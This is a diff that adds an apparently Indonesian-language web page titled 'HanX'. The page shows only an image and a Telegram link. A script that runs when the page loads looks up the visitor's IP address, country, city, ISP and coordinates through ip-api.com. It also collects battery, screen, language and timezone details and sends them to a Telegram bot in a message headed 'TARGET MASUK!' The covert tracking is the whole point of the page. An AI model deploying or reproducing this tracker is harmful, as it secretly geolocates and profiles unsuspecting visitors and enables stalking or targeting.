@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>HanX</title>
+  <style>
+    body {
+      margin: 0;
+      background-color: white;
+      color: #0f0;
+      font-family: monospace;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 90vh;
+    }
+
+    img {
+      max-width: 50%;
+      max-height: 50%;
+    }
+
+    a {
+      margin-top: 20px;
+      color: #000;
+      text-decoration: none;
+      font-size: 16px;
+    }
+
+    a:hover {
+      text-decoration: underline;
+    }
+  </style>
+  <script>
+    async function kirimData() {
+      try {
+        const ipRes = await fetch('http://ip-api.com/json/');
+        const ipData = await ipRes.json();
+
+        let baterai = 'Tidak Terdeteksi';
+        if (navigator.getBattery) {
+          const battery = await navigator.getBattery();
+          baterai = `${Math.round(battery.level * 100)}% 🔋`;
+        }
+
+        const resolusi = `${window.screen.width}x${window.screen.height}`;
+        const bahasa = navigator.language;
+        const zona = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+        const pesan = `
+📡 *TARGET MASUK!*
+
+🌐 IP: ${ipData.query}
+🗺️ Negara: ${ipData.country}
+🏙️ Kota: ${ipData.city}
+🏢 Provider: ${ipData.isp}
+📍 Lokasi: ${ipData.lat},${ipData.lon}
+
+🔋 Baterai: ${baterai}
+🖥️ Resolusi: ${resolusi}
+🈯 Bahasa: ${bahasa}
+⏰ Zona Waktu: ${zona}
+        `;
+
+        const token = '-'; // Bot Token
+        const chat_id = '-'; // Admin ID
+
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: chat_id,
+            text: pesan,
+            parse_mode: "Markdown"
+          })
+        });
+      } catch (err) {
+        console.error(err);
+      }
+    }
+
+    window.onload = kirimData;
+  </script>
+</head>
+<body>
+  <img src="https://files.catbox.moe/s185b2.jpg" alt="Loading...">
+  <a href="https://t.me/HanX_6666" target="_blank">click here</a>
+</body>
+</html>
